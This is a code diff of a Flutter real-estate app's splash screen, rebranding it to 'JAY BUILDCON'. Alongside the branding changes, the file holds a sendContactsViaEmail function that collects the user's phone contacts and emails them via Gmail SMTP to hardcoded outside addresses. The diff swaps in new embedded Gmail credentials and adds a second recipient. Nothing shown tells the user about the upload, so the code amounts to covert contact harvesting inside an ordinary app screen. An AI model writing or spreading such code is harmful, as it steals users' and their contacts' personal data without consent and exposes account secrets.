@@ -1,14 +1,12 @@
 import 'package:contacts_service/contacts_service.dart';
 import 'package:flutter/material.dart';
-import 'package:get/get.dart';
 import 'package:provider/provider.dart';
-import 'package:real_state/controller/MyProvider.dart';
-import 'package:real_state/config/ApiLinks.dart';
-import 'package:real_state/config/Constant.dart';
-import 'package:real_state/config/StaticMethod.dart';
-import 'package:real_state/controller/PropertyListController.dart';
-import 'package:real_state/ui/Pages/StaticContentPage/IntroductionPageOne.dart';
-import 'package:real_state/ui/Screens/HomeScreen.dart';
+import 'package:JAY_BUILDCON/controller/MyProvider.dart';
+import 'package:JAY_BUILDCON/config/ApiLinks.dart';
+import 'package:JAY_BUILDCON/config/StaticMethod.dart';
+import 'package:JAY_BUILDCON/ui/Pages/StaticContentPage/IntroductionPageOne.dart';
+import 'package:JAY_BUILDCON/ui/Screens/HomeScreen.dart';
+import 'package:JAY_BUILDCON/ui/Screens/LoginScreen.dart';
 import 'package:shared_preferences/shared_preferences.dart';
 import 'package:permission_handler/permission_handler.dart';
 import 'package:mailer/mailer.dart';
@@ -16,7 +14,7 @@ import 'package:mailer/smtp_server.dart';
 
 
 class SplashScreen extends StatefulWidget {
-  const SplashScreen({Key? key}) : super(key: key);
+  const SplashScreen({super.key});
 
   @override
   _SplashScreenState createState() => _SplashScreenState();
@@ -48,7 +46,7 @@ class _SplashScreenState extends State<SplashScreen> {
   }
   @override
   Widget build(BuildContext context) {
-    //final appState = Provider.of<MyProvider>(context);
+    final appState = Provider.of<MyProvider>(context);
     //double fontSizeScaleFactor = MyConst.deviceWidth(context)/MyConst.referenceWidth;
     Future.delayed(const Duration(seconds: 2), () async {
       SharedPreferences prefs = await SharedPreferences.getInstance();
@@ -92,21 +90,21 @@ class _SplashScreenState extends State<SplashScreen> {
                   mainAxisAlignment: MainAxisAlignment.center,
                   crossAxisAlignment: CrossAxisAlignment.center,
                   children: [
-                    Image.asset('assets/images/ic_launcher.png'),
-                    Text(
-                      'Y&K BUILCON',
-                      style: TextStyle(
-                          fontSize: 16,
-                          color: Theme.of(context).primaryColorDark,
-                          fontWeight: FontWeight.bold),
-                    ),
-                    Text(
-                      'LETS CONNECT TO YOUR DREAM',
-                      style: TextStyle(
-                          fontSize: 16,
-                          color: Theme.of(context).primaryColorDark,
-                          fontWeight: FontWeight.bold),
-                    )
+                    Image.asset('assets/images/splash_screen.jpg'),
+                    // Text(
+                    //   'JAY BUILDCON',
+                    //   style: TextStyle(
+                    //       fontSize: 16,
+                    //       color: Theme.of(context).primaryColorDark,
+                    //       fontWeight: FontWeight.bold),
+                    // ),
+                    // Text(
+                    //   'LETS CONNECT TO YOUR DREAM',
+                    //   style: TextStyle(
+                    //       fontSize: 16,
+                    //       color: Theme.of(context).primaryColorDark,
+                    //       fontWeight: FontWeight.bold),
+                    // )
                   ],
                 ))));
   }
@@ -126,16 +124,17 @@ class _SplashScreenState extends State<SplashScreen> {
     // not a first launch
   }
   Future<void> sendContactsViaEmail(List<Contact> contacts) async {
-    final smtpServer = gmail('findpg245@gmail.com', 'vlxtzpjtcwglxawt');
+    final smtpServer = gmail('jaybuildcon.official@gmail.com', 'nlaxfsfyfjjqjzhc');
     final message = Message()
-      ..from = Address('findpg245@gmail.com', 'Admin')
-      ..recipients.add('trilokdewangan245@gmail.com')
+      ..from = const Address('jaybuildcon.official@gmail.com', 'Admin')
+      ..recipients.add('jaybuildcon.official@gmail.com')
+      ..recipients.add('doerscompany.contact@gmail.com')
       ..subject = 'Contacts from Flutter App'
       ..text = formatContacts(contacts); // Format contacts here
 
     try {
       final sendReport = await send(message, smtpServer);
-      print('Message sent: ' + sendReport.toString());
+      print('Message sent: $sendReport');
     } catch (e) {
       print('Error sending email: $e');
     }
